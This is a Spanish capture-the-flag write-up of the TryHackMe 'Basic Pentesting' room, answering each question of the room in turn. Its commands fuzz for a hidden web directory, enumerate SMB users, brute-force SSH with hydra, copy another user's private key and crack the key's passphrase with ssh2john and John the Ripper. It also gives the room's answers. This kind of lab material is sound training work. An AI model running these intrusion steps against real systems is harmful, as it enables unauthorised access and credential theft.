# Basic Pentesting Room

## INDEX

- [[#¿Cuál es el nombre del directorio oculto en el servidor web (ingrese el nombre sin /)?|¿Cuál es el nombre del directorio oculto en el servidor web (ingrese el nombre sin /)?]]
- [[#Cual es el nombre de usuario?|Cual es el nombre de usuario?]]
- [[#¿Cual es la contraseña?|¿Cual es la contraseña?]]
- [[#¿Qué servicio utiliza para acceder al servidor (responda en abreviatura en mayúsculas)?|¿Qué servicio utiliza para acceder al servidor (responda en abreviatura en mayúsculas)?]]
- [[#¿Cuál es el nombre del otro usuario que encontró (todo en minúsculas)?|¿Cuál es el nombre del otro usuario que encontró (todo en minúsculas)?]]
- [[#¿Cuál es la contraseña final que obtienes?|¿Cuál es la contraseña final que obtienes?]]


![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/THM/BASIC_PENTESTING/images/1.png)

Enumeracion de puertos y servicios:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/THM/BASIC_PENTESTING/images/2.png)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/THM/BASIC_PENTESTING/images/3.png)

##   ¿Cuál es el nombre del directorio oculto en el servidor web (ingrese el nombre sin /)?

El puerto 8080 es un apache Tomcat y no creo que el directorio oculto se encuentre ahi. Vamos a realizar fuzzing con el el puerto 80:

```bash
wfuzz -c -t 100 --hw=24 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.187.52/FUZZ
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/THM/BASIC_PENTESTING/images/4.png)

el directorio oculto es **development**.

## Cual es el nombre de usuario?

Vemos que tiene  el puerto 139 y 445 de **netbios**, mediante enum4linux vamos a enumerar lo mas que podemos de estos servicios:

```bash
enum4linux -a 10.10.75.140
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/THM/BASIC_PENTESTING/images/5.png)

el nombre de usuario es **jan**
  
## ¿Cual es la contraseña?

vamos a aplicar fuerza bruta con hydra para el servicio SSH que lo tenia abierto:

```bash
hydra -L names.txt -P pass.txt 10.10.75.140 -t 4 -v ssh 
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/THM/BASIC_PENTESTING/images/6.png)

la conrtaseña es **armando**.

##   ¿Qué servicio utiliza para acceder al servidor (responda en abreviatura en mayúsculas)?

Lo hicimos mediante **SSH**.

  
## ¿Cuál es el nombre del otro usuario que encontró (todo en minúsculas)?

```bash
ssh jan@10.10.75.140
<armando>
```

Lo enumeramos con **enum4linux** o sino una vez dentro lo podemos ver en el archivo **/etc/passwd**:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/THM/BASIC_PENTESTING/images/7.png)

la respuesta es **kay**.

## ¿Cuál es la contraseña final que obtienes?

Vemos que en su carpeta local del usuario **kay** hay una carpta oclta llamada **.ssh**, ahi normalmente se encuentran las llaves publicas y privadas que el usuario genera y un archivo llamado **authorized_keys** que contiene las llaves publicas que son admitidas para una autenticacion mediante llave **id_rsa**.

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/THM/BASIC_PENTESTING/images/8.png)

vamos a copiarnos la llave privada a nuesro equipo Kali, le damos el permiso 600 e intentamos autenticarnos con esa llave y el usuario kay:

```bash
chmod 600 id_rsa

ssh -i id_rsa kay@10.10.75.140

```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/THM/BASIC_PENTESTING/images/9.png)

vemos que nos pide una conrtaseña pero no la sabemos, Asi que vamos a intentar crackearla. Usaremos **ssh2john**, esta herramienta es parte de la suite John The Reaper. Este es un script que básicamente transforma la clave privada de [RSA / DSA / EC / OPENSSH (claves privadas SSH)] al formato john para descifrarla más tarde usando JtR

[ssh2john github](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py)

[tutorial ssh2john](https://vk9-sec.com/ssh2john-how-to/)

extraemos el hash:

```bash
python2 ssh2john.py id_rsa > id_rsa.hash
```

ahora intentamos crackearlo con John The Ripper:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

vemos la contraseña:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/THM/BASIC_PENTESTING/images/10.png)

ahora volvemos a conectarnos con la llave privada ya que sabemos la contraeña:

```bash
ssh -i id_rsa kay@10.10.75.140

<contraseña hallada>
```

estamos dentro y podemos ver la contraseña final:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/THM/BASIC_PENTESTING/images/11.png)


